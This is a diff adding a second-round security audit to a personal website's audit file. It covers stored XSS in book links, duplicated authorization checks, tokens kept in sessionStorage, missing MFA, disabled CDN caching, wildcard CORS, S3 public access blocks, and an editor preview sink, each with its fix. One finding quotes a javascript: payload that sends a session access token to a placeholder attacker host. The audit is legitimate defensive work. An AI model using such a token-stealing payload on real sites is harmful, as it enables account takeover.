@@ -2,9 +2,386 @@
 
 > Principal Application Security Engineer + Abuse Prevention review.
 > Scope: all Lambda functions, Terraform infrastructure, and frontend HTML.
-> Date: 2026-07-26
+> Date: 2026-07-26 (Round 1) · 2026-07-30 (Round 2)
 
 ---
+
+# Round 2 — 2026-07-30
+
+Re-audit against the current working tree, including the in-flight migration of
+`admin-apps`/`admin-files`/`admin-users`/`upload-url`/`reading-log` to the new shared
+`src/shared/auth.mjs`, and the new `site/books/` pages. All Round 1 findings below
+(SEC-01–SEC-16) remain fixed; this pass found new issues layered on top of that work.
+
+---
+
+## [HIGH]
+
+### SEC-17 — Stored XSS via unvalidated URL scheme in `book.goodreadsUrl`
+
+**Location:**
+- `site/apps/booktimeline/index.html:326` — `buildPopupHTML()`
+- `site/books/book.html:360` — book detail page
+
+**Vector:** Any account in the `editors` or `admins` Cognito group can create/update a book
+record via `POST/PUT /v1/reading/books` (`src/functions/reading-log/index.mjs`) and set
+`goodreadsUrl` (or `coverUrl`) to an arbitrary string. The frontend HTML-escapes the value
+with `esc()` before interpolating it into an `href` attribute, but `esc()` only escapes
+`& < > " '` — it never validates the URL **scheme**. A value like
+`javascript:fetch('https://evil.example/steal?t='+sessionStorage.access_token)` passes
+escaping untouched and renders as a clickable "Goodreads" link on **public, unauthenticated**
+book/timeline pages (`GET /v1/reading/books` and `/v1/reading/reads` have no JWT authorizer in
+`infra/api.tf`). Any visitor — including an `admins`-group user browsing the public site with
+their own session active — who clicks the link executes attacker JS in the page's origin, with
+full access to `sessionStorage` (which holds the access token, ID token, and 30-day refresh
+token — see SEC-19). This turns an editor-level content-write bug into a path to full account
+takeover of anyone who clicks, including admins.
+
+```js
+// CURRENT — site/apps/booktimeline/index.html / site/books/book.html
+if (book.goodreadsUrl) {
+  exactLinks.push(`<a class="ip-link ip-link-gr" href="${esc(book.goodreadsUrl)}" target="_blank">Goodreads</a>`);
+  // ↑ esc() blocks attribute breakout but NOT javascript:/data: scheme injection
+}
+```
+
+**Fix:** Add a scheme allowlist helper in `site/js/util.js` and use it wherever a stored URL
+reaches `href`/`src`:
+
+```js
+// site/js/util.js
+function safeUrl(u) {
+  try {
+    const parsed = new URL(String(u ?? ''), window.location.origin);
+    return ['http:', 'https:'].includes(parsed.protocol) ? parsed.href : '';
+  } catch {
+    return '';
+  }
+}
+```
+
+```js
+// site/apps/booktimeline/index.html and site/books/book.html
+if (book.goodreadsUrl) {
+  const url = safeUrl(book.goodreadsUrl);
+  if (url) exactLinks.push(`<a class="ip-link ip-link-gr" href="${esc(url)}" target="_blank" rel="noopener">Goodreads</a>`);
+}
+// apply the same treatment to book.coverUrl before use in <img src="...">
+```
+
+Optionally also enforce the same allowlist server-side in `createBook`/`updateBook`
+(`src/functions/reading-log/index.mjs`) so bad data can never be stored:
+
+```js
+function isSafeUrl(u) {
+  if (!u) return true; // optional field
+  try { return ['http:', 'https:'].includes(new URL(u).protocol); }
+  catch { return false; }
+}
+// in createBook/updateBook, before writing:
+if (!isSafeUrl(body.goodreadsUrl) || !isSafeUrl(body.coverUrl)) return err('Invalid URL');
+```
+
+- [x] **[SEC-17]** Add `safeUrl()` scheme validation before rendering `goodreadsUrl`/`coverUrl` in `href`/`src` — fixed 2026-07-30
+- [x] **[SEC-17b]** Validate URL scheme server-side in `createBook`/`updateBook` — fixed 2026-07-30
+
+---
+
+## [MEDIUM]
+
+### SEC-18 — `create-post`/`update-post`/`delete-post` use duplicated, non-shared authorization logic that silently excludes admins
+
+**Location:**
+- `src/functions/create-post/index.mjs:9-12`
+- `src/functions/update-post/index.mjs:8-11`
+- `src/functions/delete-post/index.mjs:8-11`
+
+**Vector:** The current working-tree diff migrates `admin-apps`, `admin-files`, `admin-users`,
+`upload-url`, and `reading-log` from ad-hoc, buggy `cognito:groups` parsing (comma-split —
+wrong, since API Gateway HTTP API actually emits this claim as `"[group1 group2]"`, a
+bracket-wrapped, space-separated string, per the authoritative comment now in
+`src/shared/auth.mjs`) to the shared, correct `parseGroups()`/`requireEditor()`/`requireAdmin()`
+helpers. `create-post`, `update-post`, and `delete-post` were **not** migrated — they still
+inline:
+
+```js
+function requireEditor(event) {
+  const groups = event.requestContext?.authorizer?.jwt?.claims?.['cognito:groups'] ?? [];
+  if (!groups.includes('editors')) throw { statusCode: 403, message: 'Editors only' };
+}
+```
+
+This "works" today only because `String.prototype.includes` happens to substring-match
+`'editors'` inside the bracket-wrapped claim string, but it:
+1. Never grants `admins` the editor capabilities they get everywhere else in the app
+   (`src/shared/auth.mjs`'s `requireEditor` explicitly OR's in `admins`) — admin accounts are
+   unexpectedly locked out of post create/update/delete.
+2. Is one refactor away from a real authorization bug: if a future Cognito group name ever
+   substring-collides with `'editors'`, or the claims format changes again (it already has
+   once), this silently breaks with no shared, tested implementation backing it.
+
+These three Lambdas are also packaged via plain `source_dir` in `infra/lambdas.tf` rather than
+the explicit multi-`source` block the migrated functions use, so `auth.mjs` isn't even bundled
+into their zips today — fixing the code alone isn't enough, the Terraform packaging needs to
+change too.
+
+**Exact Fix:**
+
+```js
+// src/functions/create-post/index.mjs, update-post/index.mjs, delete-post/index.mjs
+import { requireEditor } from './auth.mjs';
+// delete the local requireEditor function; existing requireEditor(event) call sites need no other change
+```
+
+```hcl
+# infra/lambdas.tf — replace source_dir with explicit sources, mirroring admin_apps/upload_url
+data "archive_file" "create_post" {
+  type        = "zip"
+  output_path = "${path.module}/.lambda-zips/create-post.zip"
+  source {
+    content  = file("${path.module}/../src/functions/create-post/index.mjs")
+    filename = "index.mjs"
+  }
+  source {
+    content  = file("${path.module}/../src/shared/auth.mjs")
+    filename = "auth.mjs"
+  }
+}
+# repeat identically for update_post and delete_post
+```
+
+- [x] **[SEC-18]** Import shared `requireEditor` in create-post/update-post/delete-post; delete inline copies — fixed 2026-07-30
+- [x] **[SEC-18b]** Update `infra/lambdas.tf` archive_file blocks for those 3 functions to bundle `auth.mjs` — fixed 2026-07-30
+
+---
+
+### SEC-19 — Access, ID, and 30-day refresh tokens stored in `sessionStorage`
+
+**Location:** All PKCE pages — `site/index.html`, `site/books/index.html`, `site/admin/index.html`,
+`site/profile.html`, `site/post.html`, `site/apps.html`, `site/books/book.html`.
+Refresh token lifetime: `infra/cognito.tf` (`refresh_token_validity = 30` days).
+
+**Vector:** `sessionStorage` is readable by any JavaScript executing on the page — no
+`HttpOnly` boundary exists. Combined with SEC-17 (or any future XSS, including a future
+compromise of the `cdnjs.cloudflare.com` scripts allowed by CSP `script-src`), a successful
+script injection can exfiltrate the access token, ID token, and — most damaging — the refresh
+token, which stays valid for 30 days and can be redeemed for fresh access tokens long after the
+victim closes the tab. This significantly amplifies the impact of any XSS finding in this app.
+
+**Fix:** Full remediation (moving refresh-token handling to an `HttpOnly` cookie via a
+lightweight backend token-exchange endpoint) is a larger architectural change. As an
+incremental step available now:
+1. Fix SEC-17 and audit remaining `innerHTML` sinks for URL-scheme validation — the realistic
+   XSS entry point today.
+2. Shrink the exfiltration window:
+   ```hcl
+   # infra/cognito.tf
+   refresh_token_validity = 7  # was 30
+   ```
+
+- [x] **[SEC-19]** Reduce `refresh_token_validity` from 30 to 7 days (or less) — fixed 2026-07-30
+- [ ] **[SEC-19b]** Track as accepted risk / backlog: move refresh token off JS-readable storage (requires backend token exchange) — deferred, architectural change
+
+---
+
+### SEC-20 — No Cognito Advanced Security / MFA
+
+**Location:** `infra/cognito.tf` — `aws_cognito_user_pool.main` has no `user_pool_add_ons`
+block and no `mfa_configuration`.
+
+**Vector:** The user pool relies solely on password policy + optional WebAuthn passkeys. No
+compromised-credential screening, no adaptive/risk-based auth, and MFA is not enforced for any
+group — including `admins`, who can create/delete users and delete arbitrary content. A leaked
+or brute-forced admin password is a full site takeover with no second factor required.
+
+**Fix:**
+```hcl
+resource "aws_cognito_user_pool" "main" {
+  # ...existing config...
+
+  mfa_configuration = "OPTIONAL"   # or "ON" to force for all users
+
+  software_token_mfa_configuration {
+    enabled = true
+  }
+
+  user_pool_add_ons {
+    advanced_security_mode = "ENFORCED"
+  }
+}
+```
+
+- [x] **[SEC-20]** Enable `software_token_mfa_configuration` + set `mfa_configuration = "OPTIONAL"` (or `"ON"`) — fixed 2026-07-30
+- [ ] **[SEC-20b]** Enable `user_pool_add_ons { advanced_security_mode = "ENFORCED" }` — deferred (paid feature, user declined for now)
+
+---
+
+### SEC-21 — `/v1/*` CDN caching is fully disabled, defeating the app's own `Cache-Control` headers and enabling upstream-API abuse
+
+**Location:** `infra/cloudfront.tf` — the `/v1/*` `ordered_cache_behavior` uses
+`cache_policy_id = "4135ea2d-6df8-44a3-9df3-4b5a84be39ad"` (AWS managed **CachingDisabled**)
+for *all* `/v1/*` routes. Meanwhile `src/functions/lt-proxy/index.mjs` sets
+`Cache-Control: public, max-age=3600` and `src/functions/rss-feed/index.mjs` sets
+`max-age=900` — both are silently ignored by CloudFront.
+
+**Vector:** `GET /v1/proxy/librarything` is intentionally unauthenticated and proxies to a
+rate/quota-limited third-party API using a single shared `LT_API_KEY`
+(`infra/lambdas.tf`). Because CloudFront never caches the response, every request — including
+scripted/repeated requests from an abuser — invokes the Lambda and hits LibraryThing directly.
+API Gateway's account-wide throttle (`throttling_rate_limit = 20`/sec) is generous enough that
+a modest, sustained scrape can exhaust or throttle the shared LibraryThing key (denial of
+service for the real feature) and run up Lambda costs, all while the code's own caching intent
+is nullified.
+
+**Fix:** Give `/v1/proxy/librarything` and `/v1/feed.xml` their own cache behaviors, declared
+before the generic `/v1/*` behavior (CloudFront matches most-specific-first):
+```hcl
+# infra/cloudfront.tf
+ordered_cache_behavior {
+  path_pattern     = "/v1/proxy/librarything"
+  target_origin_id = "ApiOrigin"
+
+  viewer_protocol_policy     = "https-only"
+  allowed_methods            = ["GET", "HEAD"]
+  cached_methods              = ["GET", "HEAD"]
+  cache_policy_id             = "658327ea-f89d-4fab-a63d-7e88639e58f6"  # CachingOptimized — honors Lambda's max-age
+  response_headers_policy_id  = aws_cloudfront_response_headers_policy.security.id
+}
+
+ordered_cache_behavior {
+  path_pattern     = "/v1/feed.xml"
+  target_origin_id = "ApiOrigin"
+
+  viewer_protocol_policy     = "https-only"
+  allowed_methods            = ["GET", "HEAD"]
+  cached_methods              = ["GET", "HEAD"]
+  cache_policy_id             = "658327ea-f89d-4fab-a63d-7e88639e58f6"  # CachingOptimized
+  response_headers_policy_id  = aws_cloudfront_response_headers_policy.security.id
+}
+```
+
+- [x] **[SEC-21]** Add dedicated cached `ordered_cache_behavior` blocks for `/v1/proxy/librarything` and `/v1/feed.xml` — fixed 2026-07-30, verified live (feed.xml: `x-cache: Hit from cloudfront`)
+
+---
+
+## [LOW]
+
+### SEC-22 — Public `list-apps` endpoint uses wildcard CORS
+
+**Location:** `src/functions/list-apps/index.mjs` — `Access-Control-Allow-Origin: '*'`.
+
+**Vector:** Data returned is intentionally public and non-sensitive, so this isn't a
+confidentiality issue, but it allows any third-party site to fetch/embed your app catalog, and
+it's inconsistent with every other Lambda in the project (which scope CORS to
+`https://oldforest.net`, per SEC-09's fix in Round 1). Low-value abuse surface rather than a
+real vulnerability.
+
+**Fix:**
+```js
+// src/functions/list-apps/index.mjs
+const CORS = { 'Access-Control-Allow-Origin': 'https://oldforest.net', 'Content-Type': 'application/json' };
+```
+
+- [x] **[SEC-22]** Replace CORS `*` with `https://oldforest.net` in `list-apps` — fixed 2026-07-30, verified live
+
+---
+
+### SEC-23 — S3 buckets have no explicit Public Access Block
+
+**Location:** `infra/s3.tf` — `aws_s3_bucket.site` and `aws_s3_bucket.content` have bucket
+policies scoping `s3:GetObject` to the CloudFront distribution via OAC + `SourceArn` condition
+(correct), but neither bucket has an `aws_s3_bucket_public_access_block` resource.
+
+**Vector:** No public ACL or public bucket policy exists today, so there's no active exposure.
+But without an explicit Public Access Block, a future accidental `PutBucketAcl` call, a
+misconfigured Terraform change, or a manual console edit could make objects (including
+`posts/*` markdown and uploaded images) directly public, bypassing the CloudFront-only access
+model, with no safety net to catch it.
+
+**Fix:**
+```hcl
+# infra/s3.tf
+resource "aws_s3_bucket_public_access_block" "site" {
+  bucket                  = aws_s3_bucket.site.id
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+
+resource "aws_s3_bucket_public_access_block" "content" {
+  bucket                  = aws_s3_bucket.content.id
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+```
+
+- [x] **[SEC-23]** Add `aws_s3_bucket_public_access_block` for `site` and `content` buckets — fixed 2026-07-30
+
+---
+
+### SEC-24 — Editor image-URL preview builds `innerHTML` from partially-sanitized input
+
+**Location:** `site/editor/index.html:689`
+```js
+preview.innerHTML = `<img src="${url.replace(/"/g,'')}" ... onerror="this.parentElement.innerHTML='<span ...>Bad URL</span>'">`;
+```
+
+**Vector:** Only `"` is stripped from `url` before interpolation into an `src="..."` attribute
+inside an `innerHTML` string. This is restricted to the authenticated editor UI (not
+public-facing), so exploitation requires an already-trusted editor account, and attribute
+breakout is blocked by the quote-stripping — but it's a fragile, string-concatenation pattern
+(no scheme validation) sitting next to properly `esc()`-escaped code elsewhere in the same
+file. Bring it in line with SEC-17's fix.
+
+**Fix:** Build the element via the DOM API and reuse the `safeUrl()` helper from SEC-17:
+```js
+function setPreview(url) {
+  preview.innerHTML = '';
+  const safe = safeUrl(url);
+  if (!safe) {
+    preview.innerHTML = '<span style="color:var(--muted);font-size:12px">No image</span>';
+    return;
+  }
+  const img = document.createElement('img');
+  img.src = safe;
+  img.style.cssText = 'width:100%;height:100%;object-fit:cover;';
+  img.onerror = () => { preview.innerHTML = '<span style="color:var(--muted);font-size:12px">Bad URL</span>'; };
+  preview.appendChild(img);
+}
+```
+
+- [x] **[SEC-24]** Rebuild editor image preview with DOM API + `safeUrl()` instead of string-concatenated `innerHTML` — fixed 2026-07-30
+
+---
+
+## Round 2 Summary Table
+
+| ID | Severity | Location | Subject |
+|----|----------|----------|---------|
+| SEC-17 | HIGH | `booktimeline/index.html`, `books/book.html`, `reading-log/index.mjs` | Stored XSS via unvalidated `javascript:`/`data:` scheme in book links |
+| SEC-18 | MEDIUM | `create-post`, `update-post`, `delete-post`, `infra/lambdas.tf` | Duplicated, non-shared auth check excludes admins; not on shared `auth.mjs` |
+| SEC-19 | MEDIUM | all auth pages, `infra/cognito.tf` | Tokens (incl. 30-day refresh token) in `sessionStorage` widen XSS blast radius |
+| SEC-20 | MEDIUM | `infra/cognito.tf` | No MFA / adaptive security on Cognito user pool |
+| SEC-21 | MEDIUM | `infra/cloudfront.tf`, `lt-proxy`, `rss-feed` | `/v1/*` CDN caching disabled — defeats caching, enables 3rd-party API abuse |
+| SEC-22 | LOW | `list-apps/index.mjs` | Wildcard CORS on public apps list |
+| SEC-23 | LOW | `infra/s3.tf` | No explicit S3 Public Access Block |
+| SEC-24 | LOW | `editor/index.html` | Editor preview builds `innerHTML` from partially-sanitized URL |
+
+**Checked and found sound in this pass:** DynamoDB/Cognito SDK calls are all parameterized (no
+injection); post content still goes through `marked` → `DOMPurify` with `FORBID_TAGS`/`FORBID_ATTR`
+(SEC-03 fix holds); admin pages consistently use `esc()` for user-controlled text (book review/notes,
+filenames, user names, app names); `upload-url` still derives `Content-Type` server-side from an
+extension allowlist, never caller input (SEC-04 fix holds); the LibraryThing API key is in SSM
+`SecureString`, not hardcoded (SEC-01 fix holds); IAM roles remain scoped per-Lambda; JWT
+authorization is enforced redundantly at both the API Gateway route and in-Lambda for every write
+endpoint on `reading-log`.
+
+---
+
+# Round 1 — 2026-07-26
 
 ## CRITICAL
 
